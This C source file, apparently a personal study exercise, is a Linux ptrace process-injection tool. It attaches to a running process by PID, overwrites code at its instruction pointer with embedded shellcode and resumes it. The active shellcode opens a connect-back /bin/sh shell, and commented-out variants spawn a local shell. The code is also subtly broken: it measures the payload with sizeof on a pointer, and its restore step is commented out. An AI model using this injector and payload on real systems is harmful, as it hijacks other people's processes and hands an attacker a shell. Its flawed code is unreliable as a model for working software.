#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <sys/wait.h>//The sample of the book don't include this lib, it's wrong.
#include <alloca.h>

/*uint8_t shellcode[] = {0x48, 0x31, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0x89, 0xc6, 0x48, 0x8d, 0x3d, 0x04, 0x00, 0x00, 0x00,
                       0x04, 0x3b, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0xcc, 0x90, 0x90,
                       0x90};*/
char *shellcode = "\x6a\x0a\x5f\x6a\x01\x5e\x48\x31\xd2\x6a\x29\x58\x0f\x05\x50\x5b\x52\x48\xb9\x00\x00\x00\x00\x00\x00\x00\x01\x51\xb9\x00\x00\x00\x00\x51\xba\xff\xff\x05\xc0\x66\x21\xfa\x52\x48\x31\xf6\x56\x6a\x03\x54\x5f\x6a\x23\x58\x0f\x05\x59\x59\x53\x5f\x54\x5e\x6a\x1c\x5a\x6a\x2a\x58\x0f\x05\x48\x85\xc0\x75\xe0\x48\x96\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x57\x48\x31\xd2\x54\x5f\x6a\x3b\x58\x0f\x05";


//uint8_t shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

#define LONGSIZE  sizeof(long)

void getdata(pid_t target_pid, unsigned long addr, uint8_t *dst, unsigned long len) {
    union {
        long val;
        uint8_t bytes[LONGSIZE];
    } data;
    unsigned long i = 0;
    unsigned long j = len / LONGSIZE;
    uint8_t *laddr = dst;
    while (i < j) {
        data.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + (i * LONGSIZE), NULL);
        memcpy(laddr, data.bytes, LONGSIZE);
        ++i;
        laddr += LONGSIZE;
    }

    unsigned long remainder = len % LONGSIZE;
    if (remainder != 0) { // save the remainder, which less than LONGSIZE
        data.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + (i * LONGSIZE), NULL);
        memcpy(laddr, data.bytes, remainder);
    }
}

void putdata(pid_t target_pid, unsigned long addr, uint8_t *src, unsigned long len) {
    union {
        long val;
        uint8_t bytes[LONGSIZE];
    } data;
    unsigned long i = 0;
    unsigned long j = len / LONGSIZE;
    uint8_t *laddr = src;
    while (i < j) {
        memcpy(data.bytes, laddr, LONGSIZE);
        ptrace(PTRACE_POKEDATA, target_pid, addr + (i * LONGSIZE), data.val);
        ++i;
        laddr += LONGSIZE;
    }

    unsigned long remainder = len % LONGSIZE;
    if (remainder != 0) {
        data.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + (i * LONGSIZE), NULL);
        memcpy(data.bytes, laddr, remainder);
        ptrace(PTRACE_POKEDATA, target_pid, addr + (i * LONGSIZE), data.val);
    }
}


//  结束对目标进程的跟踪
void end_tracke_process(pid_t target_pid) {
    if ((ptrace(PTRACE_DETACH, target_pid, NULL, NULL)) < 0) {
        perror("ptrace(DETACH):");
        exit(1);
    }
}

// 让子进程继续运行
void continue_process(pid_t target_pid) {
    if ((ptrace(PTRACE_CONT, target_pid, NULL, NULL)) < 0) {
        perror("ptrace(PTRACE_CONT):");
        exit(1);
    }
}

//  恢复寄存器
void set_registers(pid_t target_pid, struct user_regs_struct *regs) {
    printf("+ Setting instruction pointer to %p\n", (void *) regs->rip);
    if ((ptrace(PTRACE_SETREGS, target_pid, NULL, regs)) < 0) {
        perror("ptrace(GETREGS):");
        exit(1);
    }
    printf("+ Run it!\n");
}

// 获取寄存器
int get_registers(pid_t target_pid, struct user_regs_struct *regs) {
    printf("+ Getting Registers\n");
    if ((ptrace(PTRACE_GETREGS, target_pid, NULL, regs)) < 0) {
        perror("ptrace(GETREGS):");
        exit(-1);
    }

    (*regs).rip += 2;
    return 0;
}

//  附加到正在运行的进程
int attach_process(pid_t target_pid) {
    printf("+ Tracing process %d\n", target_pid);
    if ((ptrace(PTRACE_ATTACH, target_pid, NULL, NULL)) < 0) {
        perror("ptrace(ATTACH):");
        exit(-1);
    }
    printf("+ Waiting for process...\n");
    wait(NULL);

    return 0;
}

typedef struct handle {
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
    uint8_t *mem;
    pid_t pid;
    uint8_t *shellcode;
    char *exec_path;
    uint64_t base;
    uint64_t stack;
    uint64_t entry;
    struct user_regs_struct pt_reg;
} handle_t;

handle_t h;
struct stat st;

uint8_t *shellcode2;
unsigned long s_len;

void payload_map() {
    int fd;
    if ((fd = open("/home/dio/Repositories/C_study/ptrace_study/x86_64/inject/t3/payload", O_RDONLY)) < 0) {
        perror("open");
        exit(-1);
    }

    /* 获取指定文件的属性 */
    if (fstat(fd, &st) < 0) {
        perror("fstat");
        exit(-1);
    }

    /* 将目标文件映射到本进程的虚拟内存中 */
    h.mem = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (h.mem == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    shellcode2 = (uint8_t *) calloc(st.st_size, 1);
    s_len = st.st_size;
    strcpy((char *) shellcode2, (char *) h.mem);

    h.ehdr = (Elf64_Ehdr *) h.mem;
    h.phdr = (Elf64_Phdr *) (h.mem + h.ehdr->e_phoff);
    h.shdr = (Elf64_Shdr *) (h.mem + h.ehdr->e_shoff);
    h.entry = h.ehdr->e_entry;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
        exit(1);
    }

    pid_t target_pid = atoi(argv[1]);
    unsigned long len = sizeof(shellcode);
    uint8_t backup[len];
    struct user_regs_struct regs;

//    payload_map();

    attach_process(target_pid);
    get_registers(target_pid, &regs);

    // get context
    getdata(target_pid, regs.rip, backup, len);
    // 对指令指针进行了修改，而这正是必须要在交出控制权之前在目标进程上设置寄存器的原因。实质上，指令指针会变为PTRACE_DEATCH减去2个字节的值。
    putdata(target_pid, regs.rip, shellcode, len);
    regs.rip += 2;
//    putdata(target_pid, regs.rip, h.mem, st.st_size);
//    regs.rip = (long long) ((long long )h.mem + (long long )h.entry);
//    set_registers(target_pid,&regs);
    continue_process(target_pid);
    int status;
/*    wait(&status);
    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
        puts("continne the child process. put Enter");
        getchar();
        regs.rip -= 2;
        putdata(target_pid, regs.rip, backup, len);

//        regs.rip += 2;
        set_registers(target_pid, &regs);
        continue_process(target_pid);
    } else {
        puts("child process error");
    }*/

//    end_tracke_process(target_pid);

    return 0;
}

